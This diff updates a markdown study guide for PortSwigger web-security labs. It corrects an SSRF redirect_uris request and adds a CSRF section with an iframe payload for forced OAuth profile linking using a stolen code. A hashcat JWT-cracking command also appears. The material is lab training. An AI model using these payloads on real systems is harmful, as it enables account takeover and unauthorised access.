@@ -524,11 +524,11 @@ Host: COLLABORATOR.DOMAIN
 
 ### SSRF redirect_uris  
 
->POST request to register data to the clien application with redirect URL endpoint in JSON body. Provide a redirect_uris array containing an arbitrary whitelist of callback URIs. Observe the redirect_uri.  
+>POST request to register data to the client application with redirect URL endpoint in JSON body. Provide a redirect_uris array containing an arbitrary whitelist of callback URIs. Observe the redirect_uri.  
 
 ```html
 POST /reg HTTP/1.1
-Host: oauth-0a8b00df03e10b2ec300149f023b0096.web-security-academy.net
+Host: oauth-TARGET.web-security-academy.net
 Content-Type: application/json
 Content-Length: 206
 
@@ -841,6 +841,20 @@ hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list
 
 <sup> JWT section ...need more input...</sup>  
 
+## CSRF  
+
+>Cross-Site Request Forgery vulnerability allows an attacker to force users to perform actions that they do not intend to perform.  
+
+!csrf](csrf.png)  
+
+>Intercepted the GET /oauth-linking?code=[...]. send to repeat to save code. Drop the request. Important to ensure that the code is not used and, remains valid. Save on exploit server an iframe in which the src attribute points to the URL you just copied.  
+
+```xml
+<iframe src="https://TARGET.web-security-academy.net/oauth-linking?code=STOLEN-CODE"></iframe>
+```  
+
+[PortSwigger Lab: Forced OAuth profile linking](https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking)  
+  
 ## Focus Scanning 
 
 >Due to the tight time limit during engagements, scan defined insertion points for specific requests.  
